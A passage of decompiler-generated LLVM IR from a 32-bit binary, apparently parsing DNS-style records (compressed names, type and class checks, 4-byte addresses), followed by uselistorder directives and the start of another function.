  %v0_100069ec = load i32, i32* %r20.global-to-local, align 4
  %v1_100069f0 = load i32, i32* %r22.global-to-local, align 4
  %v4_100069f0 = icmp eq i32 %v4_100069e8, %v1_100069f0
  %v2_100069ec = add i32 %v2_100069e4, 5
  %v1_100069f4 = add i32 %v2_100069ec, %v0_100069ec
  br i1 %v4_100069f0, label %dec_label_pc_100069fc, label %dec_label_pc_10006958

dec_label_pc_100069fc:                            ; preds = %dec_label_pc_100069dc
  store i32 %v4_100069fc, i32* %r28.global-to-local, align 4
  br i1 %v3_10006a00, label %dec_label_pc_10006958, label %dec_label_pc_10006a08.preheader

dec_label_pc_10006a08.preheader:                  ; preds = %dec_label_pc_100069fc
  %v1_10006a088 = add nsw i32 %v4_100069fc, -1
  store i32 %v1_10006a088, i32* %r0.global-to-local, align 4
  %v1_10006a109 = urem i32 %v1_10006a088, 65536
  store i32 %v1_10006a109, i32* %r28.global-to-local, align 4
  store i32 65535, i32* %r9.global-to-local, align 4
  %v4_10006a1811 = icmp eq i32 %v1_10006a109, 65535
  br i1 %v4_10006a1811, label %dec_label_pc_10006978, label %dec_label_pc_10006a20

dec_label_pc_10006a20:                            ; preds = %dec_label_pc_10006a08.preheader, %dec_label_pc_10006a08.backedge
  %v0_10006a0849 = phi i32 [ %v1_10006a10, %dec_label_pc_10006a08.backedge ], [ %v1_10006a109, %dec_label_pc_10006a08.preheader ]
  %v0_10006a7c = phi i32 [ %storemerge, %dec_label_pc_10006a08.backedge ], [ %v1_100069f4, %dec_label_pc_10006a08.preheader ]
  store i32 %v0_10006a7c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10006a2c110 = inttoptr i32 %v0_10006a7c to i8*
  %v2_10006a2c111 = load i8, i8* %v1_10006a2c110, align 1
  %v3_10006a2c112 = zext i8 %v2_10006a2c111 to i32
  store i32 %v3_10006a2c112, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v3_10006a34114 = icmp eq i8 %v2_10006a2c111, 0
  br i1 %v3_10006a34114, label %dec_label_pc_10006a78, label %dec_label_pc_10006a44.preheader

dec_label_pc_10006a44.preheader:                  ; preds = %dec_label_pc_10006a20, %dec_label_pc_10006b14
  %v2_10006a2c120 = phi i8 [ %v2_10006a2c, %dec_label_pc_10006b14 ], [ %v2_10006a2c111, %dec_label_pc_10006a20 ]
  %v3_10006a3c123.in = phi i8 [ %v2_10006a2c, %dec_label_pc_10006b14 ], [ %v2_10006a2c111, %dec_label_pc_10006a20 ]
  %v1_10006a38122.in = phi i32 [ %v3_10006a2c, %dec_label_pc_10006b14 ], [ %v3_10006a2c112, %dec_label_pc_10006a20 ]
  %v1_10006a30121 = phi i32 [ %v1_10006a30, %dec_label_pc_10006b14 ], [ 1, %dec_label_pc_10006a20 ]
  %v0_10006a2c119 = phi i32 [ %v1_10006b18, %dec_label_pc_10006b14 ], [ %v0_10006a7c, %dec_label_pc_10006a20 ]
  %v0_10006a30118 = phi i32 [ %v0_10006a3028, %dec_label_pc_10006b14 ], [ 0, %dec_label_pc_10006a20 ]
  %v0_10006a78117 = phi i32 [ %v2_10006b14, %dec_label_pc_10006b14 ], [ 1, %dec_label_pc_10006a20 ]
  br label %dec_label_pc_10006a44

dec_label_pc_10006a44:                            ; preds = %dec_label_pc_10006a44.preheader, %dec_label_pc_10006a48
  %v1_10006b14 = phi i32 [ 0, %dec_label_pc_10006a48 ], [ %v1_10006a30121, %dec_label_pc_10006a44.preheader ]
  %v0_10006a54.in = phi i32 [ %v3_10006a64, %dec_label_pc_10006a48 ], [ %v1_10006a38122.in, %dec_label_pc_10006a44.preheader ]
  %v0_10006b18 = phi i32 [ %v2_10006a60, %dec_label_pc_10006a48 ], [ %v0_10006a2c119, %dec_label_pc_10006a44.preheader ]
  %v0_10006a44.in = phi i8 [ %v2_10006a64, %dec_label_pc_10006a48 ], [ %v3_10006a3c123.in, %dec_label_pc_10006a44.preheader ]
  %v1_10006a44.in = phi i8 [ %v2_10006a64, %dec_label_pc_10006a48 ], [ %v2_10006a2c120, %dec_label_pc_10006a44.preheader ]
  %v0_10006a3028 = phi i32 [ 1, %dec_label_pc_10006a48 ], [ %v0_10006a30118, %dec_label_pc_10006a44.preheader ]
  %v0_10006a44 = icmp eq i8 %v0_10006a44.in, -65
  %v1_10006a44 = icmp ult i8 %v1_10006a44.in, -65
  %v2_10006a44 = or i1 %v0_10006a44, %v1_10006a44
  br i1 %v2_10006a44, label %dec_label_pc_10006b14, label %dec_label_pc_10006a48

dec_label_pc_10006a48:                            ; preds = %dec_label_pc_10006a44
  %v0_10006a54 = mul nuw nsw i32 %v0_10006a54.in, 256
  %v1_10006a48 = add i32 %v0_10006b18, 1
  %v2_10006a48 = inttoptr i32 %v1_10006a48 to i8*
  %v3_10006a48 = load i8, i8* %v2_10006a48, align 1
  %v4_10006a48 = zext i8 %v3_10006a48 to i32
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_10006a54 = or i32 %v4_10006a48, -49152
  %v1_10006a5c = add nsw i32 %v2_10006a54, %v0_10006a54
  %v0_10006a60 = load i32, i32* %r19.global-to-local, align 4
  %v2_10006a60 = add i32 %v1_10006a5c, %v0_10006a60
  store i32 %v2_10006a60, i32* %r9.global-to-local, align 4
  %v1_10006a64 = inttoptr i32 %v2_10006a60 to i8*
  %v2_10006a64 = load i8, i8* %v1_10006a64, align 1
  %v3_10006a64 = zext i8 %v2_10006a64 to i32
  store i32 %v3_10006a64, i32* %r0.global-to-local, align 4
  %v3_10006a68 = icmp eq i8 %v2_10006a64, 0
  br i1 %v3_10006a68, label %dec_label_pc_10006a78, label %dec_label_pc_10006a44

dec_label_pc_10006a78:                            ; preds = %dec_label_pc_10006a20, %dec_label_pc_10006b14, %dec_label_pc_10006a48
  %v0_10006a78103 = phi i32 [ %v0_10006a78117, %dec_label_pc_10006a48 ], [ 1, %dec_label_pc_10006a20 ], [ %v2_10006b14, %dec_label_pc_10006b14 ]
  %v1_10006a78 = phi i32 [ 1, %dec_label_pc_10006a48 ], [ 0, %dec_label_pc_10006a20 ], [ %v0_10006a3028, %dec_label_pc_10006b14 ]
  %v2_10006a78 = add i32 %v1_10006a78, %v0_10006a78103
  store i32 %v2_10006a78, i32* %r10.global-to-local, align 4
  %v2_10006a7c = add i32 %v2_10006a78, %v0_10006a7c
  %v3_10006a7c = inttoptr i32 %v2_10006a7c to i16*
  %v4_10006a7c = load i16, i16* %v3_10006a7c, align 2
  %v5_10006a7c = zext i16 %v4_10006a7c to i32
  store i32 %v5_10006a7c, i32* %r0.global-to-local, align 4
  %v1_10006a84 = add i32 %v2_10006a7c, 10
  store i32 %v1_10006a84, i32* @r29, align 4
  %v3_10006a88 = icmp eq i16 %v4_10006a7c, 1
  br i1 %v3_10006a88, label %dec_label_pc_10006b2c, label %dec_label_pc_10006a90

dec_label_pc_10006a90:                            ; preds = %dec_label_pc_10006b2c, %dec_label_pc_10006a78
  store i32 %v1_10006a84, i32* %r9.global-to-local, align 4
  %v1_10006a9c125 = inttoptr i32 %v1_10006a84 to i8*
  %v2_10006a9c126 = load i8, i8* %v1_10006a9c125, align 1
  %v3_10006a9c127 = zext i8 %v2_10006a9c126 to i32
  store i32 %v3_10006a9c127, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v3_10006aa4129 = icmp eq i8 %v2_10006a9c126, 0
  %v1_10006aa8130 = mul nuw nsw i32 %v3_10006a9c127, 256
  store i32 %v1_10006aa8130, i32* %r10.global-to-local, align 4
  br i1 %v3_10006aa4129, label %dec_label_pc_10006ae8, label %dec_label_pc_10006ab4.preheader

dec_label_pc_10006ab4.preheader:                  ; preds = %dec_label_pc_10006a90, %dec_label_pc_10006b20
  %v2_10006a9c135 = phi i8 [ %v2_10006a9c, %dec_label_pc_10006b20 ], [ %v2_10006a9c126, %dec_label_pc_10006a90 ]
  %v3_10006aac138.in = phi i8 [ %v2_10006a9c, %dec_label_pc_10006b20 ], [ %v2_10006a9c126, %dec_label_pc_10006a90 ]
  %v1_10006aa8137 = phi i32 [ %v1_10006aa8, %dec_label_pc_10006b20 ], [ %v1_10006aa8130, %dec_label_pc_10006a90 ]
  %v1_10006aa0136 = phi i32 [ %v1_10006aa0, %dec_label_pc_10006b20 ], [ 1, %dec_label_pc_10006a90 ]
  %v0_10006a9c134 = phi i32 [ %v1_10006b24, %dec_label_pc_10006b20 ], [ %v1_10006a84, %dec_label_pc_10006a90 ]
  %v0_10006aa0133 = phi i32 [ %v0_10006aa038, %dec_label_pc_10006b20 ], [ 0, %dec_label_pc_10006a90 ]
  %v0_10006ae8132 = phi i32 [ %v2_10006b20, %dec_label_pc_10006b20 ], [ 1, %dec_label_pc_10006a90 ]
  br label %dec_label_pc_10006ab4

dec_label_pc_10006ab4:                            ; preds = %dec_label_pc_10006ab4.preheader, %dec_label_pc_10006ab8
  %v1_10006b20 = phi i32 [ 0, %dec_label_pc_10006ab8 ], [ %v1_10006aa0136, %dec_label_pc_10006ab4.preheader ]
  %v0_10006ac4 = phi i32 [ %v1_10006adc, %dec_label_pc_10006ab8 ], [ %v1_10006aa8137, %dec_label_pc_10006ab4.preheader ]
  %v0_10006b24 = phi i32 [ %v2_10006ad0, %dec_label_pc_10006ab8 ], [ %v0_10006a9c134, %dec_label_pc_10006ab4.preheader ]
  %v0_10006ab4.in = phi i8 [ %v2_10006ad4, %dec_label_pc_10006ab8 ], [ %v3_10006aac138.in, %dec_label_pc_10006ab4.preheader ]
  %v1_10006ab4.in = phi i8 [ %v2_10006ad4, %dec_label_pc_10006ab8 ], [ %v2_10006a9c135, %dec_label_pc_10006ab4.preheader ]
  %v0_10006aa038 = phi i32 [ 1, %dec_label_pc_10006ab8 ], [ %v0_10006aa0133, %dec_label_pc_10006ab4.preheader ]
  %v0_10006ab4 = icmp eq i8 %v0_10006ab4.in, -65
  %v1_10006ab4 = icmp ult i8 %v1_10006ab4.in, -65
  %v2_10006ab4 = or i1 %v0_10006ab4, %v1_10006ab4
  br i1 %v2_10006ab4, label %dec_label_pc_10006b20, label %dec_label_pc_10006ab8

dec_label_pc_10006ab8:                            ; preds = %dec_label_pc_10006ab4
  %v1_10006ab8 = add i32 %v0_10006b24, 1
  %v2_10006ab8 = inttoptr i32 %v1_10006ab8 to i8*
  %v3_10006ab8 = load i8, i8* %v2_10006ab8, align 1
  %v4_10006ab8 = zext i8 %v3_10006ab8 to i32
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_10006ac4 = or i32 %v4_10006ab8, -49152
  %v1_10006acc = add nsw i32 %v2_10006ac4, %v0_10006ac4
  %v0_10006ad0 = load i32, i32* %r19.global-to-local, align 4
  %v2_10006ad0 = add i32 %v1_10006acc, %v0_10006ad0
  store i32 %v2_10006ad0, i32* %r9.global-to-local, align 4
  %v1_10006ad4 = inttoptr i32 %v2_10006ad0 to i8*
  %v2_10006ad4 = load i8, i8* %v1_10006ad4, align 1
  %v3_10006ad4 = zext i8 %v2_10006ad4 to i32
  store i32 %v3_10006ad4, i32* %r0.global-to-local, align 4
  %v3_10006ad8 = icmp eq i8 %v2_10006ad4, 0
  %v1_10006adc = mul nuw nsw i32 %v3_10006ad4, 256
  store i32 %v1_10006adc, i32* %r10.global-to-local, align 4
  br i1 %v3_10006ad8, label %dec_label_pc_10006ae8, label %dec_label_pc_10006ab4

dec_label_pc_10006ae8:                            ; preds = %dec_label_pc_10006a90, %dec_label_pc_10006b20, %dec_label_pc_10006ab8
  %v0_10006ae8109 = phi i32 [ %v0_10006ae8132, %dec_label_pc_10006ab8 ], [ 1, %dec_label_pc_10006a90 ], [ %v2_10006b20, %dec_label_pc_10006b20 ]
  %v1_10006ae8 = phi i32 [ 1, %dec_label_pc_10006ab8 ], [ 0, %dec_label_pc_10006a90 ], [ %v0_10006aa038, %dec_label_pc_10006b20 ]
  %v2_10006ae8 = add i32 %v1_10006ae8, %v0_10006ae8109
  %v2_10006aec = add i32 %v2_10006ae8, %v1_10006a84
  br label %dec_label_pc_10006a08.backedge

dec_label_pc_10006a08.backedge:                   ; preds = %dec_label_pc_10006ae8, %dec_label_pc_10006b98
  %v0_10006a08 = phi i32 [ %v0_10006a0849, %dec_label_pc_10006ae8 ], [ %v0_10006a08.pre, %dec_label_pc_10006b98 ]
  %storemerge = phi i32 [ %v2_10006aec, %dec_label_pc_10006ae8 ], [ %v2_10006b9c, %dec_label_pc_10006b98 ]
  %v1_10006a08 = add i32 %v0_10006a08, -1
  store i32 %v1_10006a08, i32* %r0.global-to-local, align 4
  %v1_10006a10 = urem i32 %v1_10006a08, 65536
  store i32 %v1_10006a10, i32* %r28.global-to-local, align 4
  store i32 65535, i32* %r9.global-to-local, align 4
  %v4_10006a18 = icmp eq i32 %v1_10006a10, 65535
  br i1 %v4_10006a18, label %dec_label_pc_10006978, label %dec_label_pc_10006a20

dec_label_pc_10006af4:                            ; preds = %dec_label_pc_10006978
  %v1_10006af4 = add i32 %v0_10006980, 4
  %v2_10006af4 = inttoptr i32 %v1_10006af4 to i32*
  %v3_10006af4 = load i32, i32* %v2_10006af4, align 4
  store i32 %v3_10006af4, i32* @r3, align 4
  %v3_10006af8 = icmp eq i32 %v3_10006af4, 0
  br i1 %v3_10006af8, label %dec_label_pc_10006b04, label %dec_label_pc_10006b00

dec_label_pc_10006b00:                            ; preds = %dec_label_pc_10006af4
  store i32 268462852, i32* @lr, align 4
  %v0_10006b00 = call i32 @function_10008f30()
  %v0_10006b04.pre = load i32, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_10006b04

dec_label_pc_10006b04:                            ; preds = %dec_label_pc_10006af4, %dec_label_pc_10006b00
  %v0_10006b04 = phi i32 [ %v0_10006980, %dec_label_pc_10006af4 ], [ %v0_10006b04.pre, %dec_label_pc_10006b00 ]
  store i32 %v0_10006b04, i32* @r3, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 268462864, i32* @lr, align 4
  %v0_10006b0c = call i32 @function_10008f30()
  br label %dec_label_pc_1000698c

dec_label_pc_10006b14:                            ; preds = %dec_label_pc_10006a44
  %v2_10006b14 = add i32 %v1_10006b14, %v0_10006a78117
  store i32 %v2_10006b14, i32* %r10.global-to-local, align 4
  %v1_10006b18 = add i32 %v0_10006b18, 1
  store i32 %v1_10006b18, i32* %r9.global-to-local, align 4
  %v1_10006a2c = inttoptr i32 %v1_10006b18 to i8*
  %v2_10006a2c = load i8, i8* %v1_10006a2c, align 1
  %v3_10006a2c = zext i8 %v2_10006a2c to i32
  store i32 %v3_10006a2c, i32* %r0.global-to-local, align 4
  %v1_10006a30 = xor i32 %v0_10006a3028, 1
  store i32 %v1_10006a30, i32* %r11.global-to-local, align 4
  %v3_10006a34 = icmp eq i8 %v2_10006a2c, 0
  br i1 %v3_10006a34, label %dec_label_pc_10006a78, label %dec_label_pc_10006a44.preheader

dec_label_pc_10006b20:                            ; preds = %dec_label_pc_10006ab4
  %v2_10006b20 = add i32 %v1_10006b20, %v0_10006ae8132
  %v1_10006b24 = add i32 %v0_10006b24, 1
  store i32 %v1_10006b24, i32* %r9.global-to-local, align 4
  %v1_10006a9c = inttoptr i32 %v1_10006b24 to i8*
  %v2_10006a9c = load i8, i8* %v1_10006a9c, align 1
  %v3_10006a9c = zext i8 %v2_10006a9c to i32
  store i32 %v3_10006a9c, i32* %r0.global-to-local, align 4
  %v1_10006aa0 = xor i32 %v0_10006aa038, 1
  store i32 %v1_10006aa0, i32* %r11.global-to-local, align 4
  %v3_10006aa4 = icmp eq i8 %v2_10006a9c, 0
  %v1_10006aa8 = mul nuw nsw i32 %v3_10006a9c, 256
  store i32 %v1_10006aa8, i32* %r10.global-to-local, align 4
  br i1 %v3_10006aa4, label %dec_label_pc_10006ae8, label %dec_label_pc_10006ab4.preheader

dec_label_pc_10006b2c:                            ; preds = %dec_label_pc_10006a78
  %v1_10006b2c = add i32 %v2_10006a7c, 2
  %v2_10006b2c = inttoptr i32 %v1_10006b2c to i16*
  %v3_10006b2c = load i16, i16* %v2_10006b2c, align 2
  %v4_10006b2c = zext i16 %v3_10006b2c to i32
  store i32 %v4_10006b2c, i32* %r0.global-to-local, align 4
  %v3_10006b30 = icmp eq i16 %v3_10006b2c, 1
  br i1 %v3_10006b30, label %dec_label_pc_10006b38, label %dec_label_pc_10006a90

dec_label_pc_10006b38:                            ; preds = %dec_label_pc_10006b2c
  %v1_10006b38 = add i32 %v2_10006a7c, 8
  %v2_10006b38 = inttoptr i32 %v1_10006b38 to i16*
  %v3_10006b38 = load i16, i16* %v2_10006b38, align 2
  %v4_10006b38 = zext i16 %v3_10006b38 to i32
  store i32 %v4_10006b38, i32* %r0.global-to-local, align 4
  %v3_10006b3c = icmp eq i16 %v3_10006b38, 4
  br i1 %v3_10006b3c, label %dec_label_pc_10006b44, label %dec_label_pc_10006b98

dec_label_pc_10006b44:                            ; preds = %dec_label_pc_10006b38
  %v2_10006b44 = inttoptr i32 %v1_10006a84 to i8*
  %v3_10006b44 = load i8, i8* %v2_10006b44, align 1
  %v4_10006b44 = zext i8 %v3_10006b44 to i32
  store i32 %v4_10006b44, i32* %r0.global-to-local, align 4
  store i32 %v4_10006b44, i32* %stack_var_-4312, align 4
  %v1_10006b4c = add i32 %v2_10006a7c, 11
  %v2_10006b4c = inttoptr i32 %v1_10006b4c to i8*
  %v3_10006b4c = load i8, i8* %v2_10006b4c, align 1
  %v4_10006b4c = zext i8 %v3_10006b4c to i32
  store i32 %v4_10006b4c, i32* %r9.global-to-local, align 4
  %v1_10006b54 = add i32 %v2_10006a7c, 12
  %v2_10006b54 = inttoptr i32 %v1_10006b54 to i8*
  %v3_10006b54 = load i8, i8* %v2_10006b54, align 1
  %v4_10006b54 = zext i8 %v3_10006b54 to i32
  store i32 %v4_10006b54, i32* %r0.global-to-local, align 4
  %v1_10006b5c = add i32 %v2_10006a7c, 13
  %v2_10006b5c = inttoptr i32 %v1_10006b5c to i8*
  %v3_10006b5c = load i8, i8* %v2_10006b5c, align 1
  %v4_10006b5c = zext i8 %v3_10006b5c to i32
  store i32 %v4_10006b5c, i32* %r9.global-to-local, align 4
  %v0_10006b64 = load i32, i32* %r25.global-to-local, align 4
  %v1_10006b64 = inttoptr i32 %v0_10006b64 to i8*
  %v2_10006b64 = load i8, i8* %v1_10006b64, align 1
  %v3_10006b64 = zext i8 %v2_10006b64 to i32
  %v1_10006b68 = add i32 %v0_10006b64, 4
  %v2_10006b68 = inttoptr i32 %v1_10006b68 to i32*
  %v3_10006b68 = load i32, i32* %v2_10006b68, align 4
  %v1_10006b6c = mul nuw nsw i32 %v3_10006b64, 4
  %v1_10006b70 = add nuw nsw i32 %v1_10006b6c, 4
  store i32 268462968, i32* @lr, align 4
  %v3_10006b74 = sext i8 %v3_10006b5c to i32
  %v4_10006b74 = call i32 @function_10009030(i32 %v3_10006b68, i32 %v1_10006b70, i32 %v3_10006b74)
  %v0_10006b78 = load i32, i32* %r25.global-to-local, align 4
  %v1_10006b78 = inttoptr i32 %v0_10006b78 to i8*
  %v2_10006b78 = load i8, i8* %v1_10006b78, align 1
  %v3_10006b78 = zext i8 %v2_10006b78 to i32
  %v3_10006b7c = load i32, i32* %stack_var_-4312, align 4
  store i32 %v3_10006b7c, i32* %r0.global-to-local, align 4
  %v1_10006b80 = add nuw nsw i32 %v3_10006b78, 1
  store i32 %v1_10006b80, i32* %r11.global-to-local, align 4
  %v1_10006b84 = mul nuw nsw i32 %v3_10006b78, 4
  store i32 %v1_10006b84, i32* %r9.global-to-local, align 4
  %v3_10006b88 = add i32 %v1_10006b84, %v4_10006b74
  %v4_10006b88 = inttoptr i32 %v3_10006b88 to i32*
  store i32 %v3_10006b7c, i32* %v4_10006b88, align 4
  %v0_10006b8c = load i32, i32* %r11.global-to-local, align 4
  %v1_10006b8c = trunc i32 %v0_10006b8c to i8
  %v2_10006b8c = load i32, i32* %r25.global-to-local, align 4
  %v3_10006b8c = inttoptr i32 %v2_10006b8c to i8*
  store i8 %v1_10006b8c, i8* %v3_10006b8c, align 1
  %v1_10006b90 = load i32, i32* %r25.global-to-local, align 4
  %v2_10006b90 = add i32 %v1_10006b90, 4
  %v3_10006b90 = inttoptr i32 %v2_10006b90 to i32*
  store i32 %v4_10006b74, i32* %v3_10006b90, align 4
  %v0_10006b94 = load i32, i32* @r31, align 4
  %v1_10006b94 = add i32 %v0_10006b94, 8
  %v2_10006b94 = inttoptr i32 %v1_10006b94 to i16*
  %v3_10006b94 = load i16, i16* %v2_10006b94, align 2
  %v4_10006b94 = zext i16 %v3_10006b94 to i32
  store i32 %v4_10006b94, i32* %r0.global-to-local, align 4
  %v0_10006b9c.pre = load i32, i32* @r29, align 4
  %v0_10006a08.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006b98

dec_label_pc_10006b98:                            ; preds = %dec_label_pc_10006b38, %dec_label_pc_10006b44
  %v0_10006a08.pre = phi i32 [ %v0_10006a0849, %dec_label_pc_10006b38 ], [ %v0_10006a08.pre.pre, %dec_label_pc_10006b44 ]
  %v0_10006b9c = phi i32 [ %v1_10006a84, %dec_label_pc_10006b38 ], [ %v0_10006b9c.pre, %dec_label_pc_10006b44 ]
  %v0_10006b98 = phi i32 [ %v4_10006b38, %dec_label_pc_10006b38 ], [ %v4_10006b94, %dec_label_pc_10006b44 ]
  store i32 %v0_10006b98, i32* %r0.global-to-local, align 4
  %v2_10006b9c = add i32 %v0_10006b98, %v0_10006b9c
  br label %dec_label_pc_10006a08.backedge

dec_label_pc_10006738.preheader.thread:           ; preds = %dec_label_pc_10006694
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100067381355 = or i32 %v2_10006700, 1
  store i32 %v1_100067381355, i32* %r11.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10006768

; uselistorder directives
  uselistorder i32 %v1_10006b84, { 1, 0 }
  uselistorder i32 %v4_10006b74, { 1, 0 }
  uselistorder i32 %v1_10006aa0, { 1, 0 }
  uselistorder i8 %v2_10006a9c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10006b24, { 1, 2, 0 }
  uselistorder i32 %v2_10006b20, { 1, 0 }
  uselistorder i32 %v1_10006a30, { 1, 0 }
  uselistorder i32 %v3_10006a2c, { 1, 0 }
  uselistorder i8 %v2_10006a2c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10006b18, { 1, 2, 0 }
  uselistorder i32 %v2_10006b14, { 2, 1, 0 }
  uselistorder i32 %v1_10006a10, { 1, 0, 2 }
  uselistorder i8 %v2_10006ad4, { 2, 3, 0, 1 }
  uselistorder i32 %v2_10006ad0, { 1, 2, 0 }
  uselistorder i32 %v0_10006aa038, { 2, 0, 1 }
  uselistorder i32 %v0_10006ae8132, { 1, 0 }
  uselistorder i32 %v1_10006aa8130, { 1, 0 }
  uselistorder i32 %v1_10006a84, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %v3_10006a64, { 1, 0 }
  uselistorder i8 %v2_10006a64, { 2, 3, 0, 1 }
  uselistorder i32 %v2_10006a60, { 1, 2, 0 }
  uselistorder i32 %v0_10006a3028, { 2, 0, 1 }
  uselistorder i32 %v0_10006a78117, { 1, 0 }
  uselistorder i32 %v0_10006a7c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10006a109, { 2, 1, 0 }
  uselistorder i32 %v0_10006980, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10006970, { 1, 0 }
  uselistorder i32 %v1_1000691c, { 1, 0 }
  uselistorder i32 %v4_10006918, { 1, 0 }
  uselistorder i32 %v1_10006918, { 1, 2, 0 }
  uselistorder i32 %v3_10006914, { 2, 1, 0 }
  uselistorder i32 %v1_100068c8, { 1, 0 }
  uselistorder i32 %v0_100068c8, { 1, 0 }
  uselistorder i32 %v1_100068b8, { 1, 0 }
  uselistorder i32 %v1_100068b4, { 1, 0 }
  uselistorder i8 %v2_10006740, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1000673c, { 1, 0 }
  uselistorder i32 %v0_10006734, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10006704, { 0, 2, 1 }
  uselistorder i32 %v2_10006700, { 2, 0, 1, 4, 3, 5 }
  uselistorder i32 %v0_1000669c, { 1, 0 }
  uselistorder i16* %stack_var_-2108, { 1, 0 }
  uselistorder i16 %tmp60, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 11, 12, 13, 14, 15, 19, 16, 17, 18, 20, 0, 21, 22, 4, 1, 9, 10, 2, 3, 5, 6, 8, 7 }
  uselistorder i32* %r7.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r29.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r28.global-to-local, { 3, 0, 4, 5, 1, 2 }
  uselistorder i32* %r27.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r26.global-to-local, { 3, 2, 0, 1 }
  uselistorder i32* %r25.global-to-local, { 1, 2, 3, 4, 7, 0, 5, 6 }
  uselistorder i32* %r22.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 15, 9, 10, 12, 14, 11, 8, 13, 7, 1, 2, 3, 5, 6, 4, 0 }
  uselistorder i32* %r10.global-to-local, { 9, 7, 8, 6, 10, 11, 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 21, 24, 25, 20, 11, 22, 23, 10, 0, 26, 27, 28, 29, 30, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 9, 1, 7, 8, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 (i32, i32, i32)* @function_10009030, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i8 -65, { 2, 0, 3, 1 }
  uselistorder i32 65535, { 37, 38, 13, 14, 39, 40, 6, 7, 41, 16, 42, 17, 43, 44, 45, 46, 47, 48, 49, 18, 19, 0, 8, 50, 51, 20, 21, 22, 23, 1, 9, 52, 53, 24, 25, 26, 27, 28, 54, 10, 29, 30, 2, 11, 55, 56, 4, 31, 32, 33, 3, 12, 57, 58, 5, 34, 35, 36, 15, 59 }
  uselistorder i32 (i32)* @function_1000965c, { 1, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 2048, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10008030, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10008a80, { 3, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 16384, { 0, 14, 17, 18, 16, 19, 20, 21, 15, 1, 23, 24, 3, 2, 4, 25, 5, 26, 7, 27, 6, 8, 28, 29, 9, 30, 31, 22, 10, 11, 12, 13 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 ()* @function_10007584, { 10, 14, 13, 12, 11, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 ()* @function_10006318, { 50, 53, 52, 51, 49, 48, 47, 46, 45, 44, 43, 42, 41, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 1, 0 }
  uselistorder i32 (i8*)* @function_100074dc, { 20, 21, 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 23, 24, 27, 28, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 71, 72, 73, 74, 75, 76, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70 }
  uselistorder label %dec_label_pc_10006b98, { 1, 0 }
  uselistorder label %dec_label_pc_10006b04, { 1, 0 }
  uselistorder label %dec_label_pc_10006a08.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10006ae8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10006ab4, { 1, 0 }
  uselistorder label %dec_label_pc_10006ab4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10006a78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10006a44, { 1, 0 }
  uselistorder label %dec_label_pc_10006a44.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10006a20, { 1, 0 }
  uselistorder label %dec_label_pc_1000698c, { 1, 0 }
  uselistorder label %dec_label_pc_10006978, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10006958, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100068b0.dec_label_pc_100068b0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000682c, { 1, 0 }
  uselistorder label %dec_label_pc_10006768, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006740, { 1, 0 }
}

define i32 @function_10006bb0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10006bb0:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
